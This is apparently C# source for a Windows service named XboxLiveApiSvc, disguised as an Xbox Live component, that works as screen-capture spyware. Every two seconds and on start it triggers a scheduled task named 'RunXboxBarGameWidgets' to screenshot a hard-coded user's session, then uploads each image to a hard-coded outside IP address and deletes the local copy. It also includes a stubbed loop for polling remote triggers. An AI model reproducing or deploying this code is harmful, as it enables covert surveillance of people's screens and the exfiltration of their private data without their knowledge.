using Renci.SshNet;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Timers;

namespace XbozPcAppFT
{
    public enum ServiceState
    {
        SERVICE_STOPPED = 0x00000001,
        SERVICE_START_PENDING = 0x00000002,
        SERVICE_STOP_PENDING = 0x00000003,
        SERVICE_RUNNING = 0x00000004,
        SERVICE_CONTINUE_PENDING = 0x00000005,
        SERVICE_PAUSE_PENDING = 0x00000006,
        SERVICE_PAUSED = 0x00000007,
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct ServiceStatus
    {
        public int dwServiceType;
        public ServiceState dwCurrentState;
        public int dwControlsAccepted;
        public int dwWin32ExitCode;
        public int dwServiceSpecificExitCode;
        public int dwCheckPoint;
        public int dwWaitHint;
    };



    public class HttpUploader
    {
        private static readonly HttpClient client = new HttpClient();
        private const int ChunkSize = 1024 * 1024; // 1MB

        public static async Task UploadFileAsync(string localPath, string serverUrl)
        {
            FileInfo fi = new FileInfo(localPath);
            long totalSize = fi.Length;
            string fileName = Path.GetFileName(localPath);

            using (FileStream fs = new FileStream(localPath, FileMode.Open, FileAccess.Read))
            {
                long offset = 0;
                while (offset < totalSize)
                {
                    int bytesToRead = (int)Math.Min(ChunkSize, totalSize - offset);
                    byte[] buffer = new byte[bytesToRead];
                    fs.Seek(offset, SeekOrigin.Begin);
                    await fs.ReadAsync(buffer, 0, bytesToRead);

                    bool success = false;
                    int retries = 3;
                    while (!success && retries > 0)
                    {
                        try
                        {
                            using (var content = new ByteArrayContent(buffer))
                            {
                                content.Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");
                                content.Headers.Add("Content-Range", $"bytes {offset}-{offset + bytesToRead - 1}/{totalSize}");

                                HttpResponseMessage response = await client.PostAsync($"{serverUrl}/upload/{fileName}", content);
                                response.EnsureSuccessStatusCode();
                                success = true;
                            }
                        }
                        catch (Exception ex)
                        {
                            retries--;
                            Console.WriteLine($"Retrying chunk {offset} - {ex.Message}");
                            if (retries == 0) throw;
                        }
                    }

                    offset += bytesToRead;
                }
            }

            Console.WriteLine("Upload complete!");
            File.Delete(localPath);
        }
    }


    public partial class XboxLiveApiSvc : ServiceBase
    {
        private Thread _triggerThread;
        private CancellationTokenSource _cts;

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool SetServiceStatus(System.IntPtr handle, ref ServiceStatus serviceStatus);

        private EventLog _eventLog1;
        private int eventId = 1;

        public XboxLiveApiSvc()
        {
            InitializeComponent();
            _eventLog1 = new EventLog();
            if (!EventLog.SourceExists("XboxSource"))
            {
                EventLog.CreateEventSource("XboxSource", "XboxLog");
            }
            _eventLog1.Source = "XboxSource";
            _eventLog1.Log = "XboxLog";
        }

        protected override void OnStart(string[] args)
        {
            _eventLog1.WriteEntry("In OnStart.");

            // Update the service state to Start Pending.
            ServiceStatus serviceStatus = new ServiceStatus();
            serviceStatus.dwCurrentState = ServiceState.SERVICE_START_PENDING;
            serviceStatus.dwWaitHint = 100000;
            SetServiceStatus(this.ServiceHandle, ref serviceStatus);

            // 1️⃣ Take a screenshot immediately
            _eventLog1.WriteEntry("Taking immediate screenshot on start...");
            TakeScreenshot();

            // 2️⃣ Set up a timer that triggers every 2s.
            System.Timers.Timer timer = new System.Timers.Timer
            {
                Interval = 2000 // 2 seconds
            };
            timer.Elapsed += new ElapsedEventHandler(this.OnTimer);
            timer.Start();

            // 3️⃣ Start trigger polling loop in background thread
            _cts = new CancellationTokenSource();
            _triggerThread = new Thread(() => PollTriggerLoop(_cts.Token));
            _triggerThread.IsBackground = true;
            _triggerThread.Start();

            // Update the service state to Running.
            serviceStatus.dwCurrentState = ServiceState.SERVICE_RUNNING;
            SetServiceStatus(this.ServiceHandle, ref serviceStatus);
        }

        protected override void OnStop()
        {
            _eventLog1.WriteEntry("In OnStop.");

            // Stop polling thread
            if (_cts != null)
            {
                _cts.Cancel();
                if (_triggerThread != null && _triggerThread.IsAlive)
                {
                    _triggerThread.Join(); // wait until thread exits
                }
            }

            // Update the service state to Stop Pending.
            ServiceStatus serviceStatus = new ServiceStatus();
            serviceStatus.dwCurrentState = ServiceState.SERVICE_STOP_PENDING;
            serviceStatus.dwWaitHint = 100000;
            SetServiceStatus(this.ServiceHandle, ref serviceStatus);

            // Update the service state to Stopped.
            serviceStatus.dwCurrentState = ServiceState.SERVICE_STOPPED;
            SetServiceStatus(this.ServiceHandle, ref serviceStatus);
        }

        private void PollTriggerLoop(CancellationToken token)
        {
            _eventLog1.WriteEntry("Trigger polling thread started.");
            try
            {
                while (!token.IsCancellationRequested)
                {
                    // ✅ Example: poll your /trigger endpoint
                    bool shouldTakeScreenshot = CheckTriggerFromServer();

                    if (shouldTakeScreenshot)
                    {
                        _eventLog1.WriteEntry("Trigger received! Taking screenshot...");
                        TakeScreenshot();
                    }

                    Thread.Sleep(5000); // poll every 5 seconds
                }
            }
            catch (Exception ex)
            {
                _eventLog1.WriteEntry($"PollTriggerLoop exception: {ex.Message}");
            }
            finally
            {
                _eventLog1.WriteEntry("Trigger polling thread stopped.");
            }
        }

        private bool CheckTriggerFromServer()
        {
            // TODO: implement HTTP GET/POST to your FastAPI /trigger
            // Example pseudo-code (use HttpClient):
            /*
            using (var client = new HttpClient())
            {
                var response = client.GetAsync("http://server:8000/check_trigger").Result;
                string result = response.Content.ReadAsStringAsync().Result;
                return result.Contains("take_screenshot");
            }
            */
            return false;
        }

        private void OnTimer(object sender, ElapsedEventArgs e)
        {
            _eventLog1.WriteEntry("Timer triggered. Attempting to take screenshot...");
            TakeScreenshot();
        }

        private void TakeScreenshot()
        {
            string userName = "hzluq";
            string userTempDir = $@"C:\Users\{userName}\AppData\Local\Temp";
            try
            {
                _eventLog1.WriteEntry("Attempting to trigger scheduled task for screenshot...");

                // 1️⃣ Run the scheduled task
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "schtasks",
                    Arguments = "/run /tn \"RunXboxBarGameWidgets\"",
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                };

                using (Process proc = Process.Start(psi))
                {
                    string output = proc.StandardOutput.ReadToEnd();
                    string error = proc.StandardError.ReadToEnd();
                    proc.WaitForExit();

                    if (proc.ExitCode == 0)
                        _eventLog1.WriteEntry($"Scheduled task triggered successfully: {output}");
                    else
                    {
                        _eventLog1.WriteEntry($"Scheduled task failed (code {proc.ExitCode}): {error}");
                        return; // Skip upload if task failed
                    }
                }

                // 2️⃣ Wait briefly to allow screenshot tool to finish
                System.Threading.Thread.Sleep(1000); // 1 seconds — adjust if needed

                // 3️⃣ Find the latest screenshot file
                var latestScreenshot = new DirectoryInfo(userTempDir)
                    .GetFiles("screenshot_*.png")
                    .OrderByDescending(f => f.LastWriteTime)
                    .FirstOrDefault();

                if (latestScreenshot == null)
                {
                    _eventLog1.WriteEntry("No screenshot file found in user's temp folder.");
                    return;
                }

                string localPath = latestScreenshot.FullName;
                string fileName = latestScreenshot.Name;

                _eventLog1.WriteEntry($"Found screenshot: {fileName}");

                // 4️⃣ Upload via SFTP
                try
                {
                    string serverUrl = "http://202.182.127.60:8000"; // FastAPI server endpoint

                    HttpUploader.UploadFileAsync(localPath, serverUrl).GetAwaiter().GetResult();

                    // 5️⃣ Clean up
                    File.Delete(localPath);
                    _eventLog1.WriteEntry($"Screenshot uploaded and deleted: {fileName}");
                }
                catch (Exception ex)
                {
                    _eventLog1.WriteEntry($"Screenshot upload failed: {ex.Message}\n{ex.StackTrace}");
                }

            }
            catch (Exception ex)
            {
                _eventLog1.WriteEntry($"Screenshot failed: {ex.Message}\n{ex.StackTrace}");
            }
        }

        protected override void OnContinue()
        {
            _eventLog1.WriteEntry("In OnContinue.");
        }
    }
}
